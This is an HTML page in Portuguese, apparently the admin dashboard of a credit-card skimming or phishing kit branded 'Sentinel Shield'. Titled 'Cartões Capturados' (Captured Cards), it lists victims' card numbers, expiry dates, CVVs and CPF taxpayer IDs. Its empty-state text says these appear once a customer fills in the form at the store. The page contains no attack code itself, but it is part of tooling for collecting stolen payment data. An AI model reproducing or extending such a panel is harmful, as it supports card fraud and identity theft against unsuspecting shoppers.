<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamentos - Sentinel Shield</title>
    <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
    <div class="app-container">
        <!-- Sidebar injetada via JS -->
        <div id="sidebar-container"></div>

        <div class="main-wrapper">
            <!-- Topbar injetada via JS -->
            <div id="topbar-container"></div>

            <main class="content">
                <header class="page-header">
                    <h1 class="page-title">Cartões Capturados</h1>
                    <p class="text-secondary">Visualização em tempo real de dados de cartões de crédito.</p>
                </header>

                <div class="glass-panel" style="padding: 0; overflow: hidden;">
                    <div id="loading-state" style="padding: 40px; text-align: center; color: var(--text-secondary);">
                        Carregando dados...
                    </div>

                    <div id="empty-state" class="empty-state" style="display: none; padding: 60px;">
                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                            <line x1="2" y1="10" x2="22" y2="10"></line>
                        </svg>
                        <h2 class="empty-state-title">Nenhum cartão capturado</h2>
                        <p class="empty-state-desc">Os dados aparecerão aqui assim que um cliente preencher o formulário na loja.</p>
                    </div>

                    <table class="data-table" id="cards-table">
                        <thead>
                            <tr>
                                <th>Dados do Cartão</th>
                                <th>Validade</th>
                                <th>CVV</th>
                                <th>CPF</th>
                                <th>Origem / Data</th>
                                <th>Ações</th>
                            </tr>
                        </thead>
                        <tbody id="cards-table-body">
                            <!-- Injetado via JS -->
                        </tbody>
                    </table>
                </div>
            </main>
        </div>
    </div>

    <script type="module">
        import { renderSidebar } from '/assets/js/components/sidebar.js';
        import { renderTopbar } from '/assets/js/components/topbar.js';
        document.addEventListener('DOMContentLoaded', () => {
            renderSidebar('payments');
            renderTopbar();
        });
    </script>
    <script src="/assets/js/payments.js"></script>
</body>
</html>
